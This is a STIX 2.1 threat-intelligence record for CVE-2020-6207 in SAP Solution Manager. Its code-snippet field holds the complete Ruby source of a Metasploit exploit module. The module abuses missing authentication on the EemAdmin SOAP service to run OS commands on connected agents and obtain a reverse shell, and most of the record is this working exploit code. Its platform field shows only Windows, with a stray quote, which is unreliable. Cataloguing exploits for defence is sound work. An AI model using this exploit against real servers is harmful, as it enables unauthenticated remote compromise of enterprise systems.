{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e9ce8e5-6085-48c2-b0ef-88a9201e964c",
    "created": "2024-08-14T17:05:25.54359Z",
    "modified": "2024-08-14T17:05:25.543594Z",
    "name": "SAP Solution Manager remote unauthorized OS commands execution",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/sap/cve_2020_6207_solman_rs.rb",
            "external_id": "cve_2020_6207_solman_rs.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-6207"
        },
        {
            "source_name": "reference",
            "url": "https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/chipik/SAP_EEM_CVE-2020-6207"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::SapSolManEemMissAuth\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SAP Solution Manager remote unauthorized OS commands execution',\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability\n          'Pablo Artuso', # @lmkalg The researcher who originally found this vulnerability\n          'Dmitry Chastuhin', # @chipik The researcher who made first PoC\n          'Vladimir Ivanov' # @_generic_human_ This Metasploit module\n        ],\n        'Description' => %q{\n          This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of\n          SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication\n          checks when submitting a SOAP request to the /EemAdminService/EemAdmin page to get information about connected SMDAgents,\n          send HTTP request (SSRF) and execute OS command on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8.\n\n          Successful exploitation will allow unauthenticated remote attackers to get reverse shell from connected to the SolMan\n          agent as the user under which it runs SMDAgent service, usually daaadm.\n        },\n        'References' => [\n          ['CVE', '2020-6207'],\n          ['URL', 'https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf'],\n          ['URL', 'https://github.com/chipik/SAP_EEM_CVE-2020-6207']\n        ],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Linux',\n            {\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Platform' => 'linux',\n              'CmdStagerFlavor' => ['printf', 'echo', 'bourne']\n            }\n          ],\n          [\n            'Windows',\n            {\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Platform' => 'win',\n              'CmdStagerFlavor' => ['certutil', 'vbs', 'debug_write', 'debug_asm']\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-10-03'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(50000),\n        OptString.new('TARGETURI', [true, 'Path to the SAP Solution Manager EemAdmin page from the web root', '/EemAdminService/EemAdmin']),\n        OptString.new('AGENT', [true, 'Agent server name for exploitation', 'agent_server_name']),\n      ]\n    )\n  end\n\n  def setup_variables\n    @host = datastore['RHOSTS']\n    @port = datastore['RPORT']\n    @path = datastore['TARGETURI']\n\n    @agent_name = datastore['AGENT']\n    @script_name = Rex::Text.rand_text_alphanumeric(12)\n\n    if datastore['SSL']\n      @schema = 'https://'\n    else\n      @schema = 'http://'\n    end\n\n    @solman_uri = \"#{@schema}#{@host}:#{@port}#{@path}\"\n  end\n\n  def execute_command(cmd, _opts = {})\n    setup_variables\n\n    vprint_status(\"Start script: #{@script_name} with RCE payload on agent: #{@agent_name}\")\n    send_soap_request(make_soap_body(@agent_name, @script_name, make_rce_payload(cmd)))\n\n    vprint_status(\"Stop script: #{@script_name} on agent: #{@agent_name}\")\n    stop_script_in_agent(@agent_name, @script_name)\n\n    vprint_status(\"Delete script: #{@script_name} on agent: #{@agent_name}\")\n    delete_script_in_agent(@agent_name, @script_name)\n  end\n\n  # Report Service and Vulnerability\n  def report_service_and_vuln\n    report_service(\n      host: @host,\n      port: @port,\n      name: 'soap',\n      proto: 'tcp',\n      info: 'SAP Solution Manager'\n    )\n    report_vuln(\n      host: @host,\n      port: @port,\n      name: name,\n      refs: references\n    )\n  end\n\n  def check\n    setup_variables\n    begin\n      agents = make_agents_array\n    rescue RuntimeError\n      return Exploit::CheckCode::Safe\n    end\n    if agents.empty?\n      print_status(\"Solution Manager server: #{@host}:#{@port} is vulnerable but no agents are connected!\")\n    else\n      print_good(\"Successfully retrieved agent list:\\n#{pretty_agents_table(agents)}\")\n    end\n    report_service_and_vuln\n    Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n    setup_variables\n    check_agent(@agent_name)\n\n    print_status(\"Enable EEM on agent: #{@agent_name}\")\n    enable_eem(@agent_name)\n\n    report_service_and_vuln\n    execute_cmdstager\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}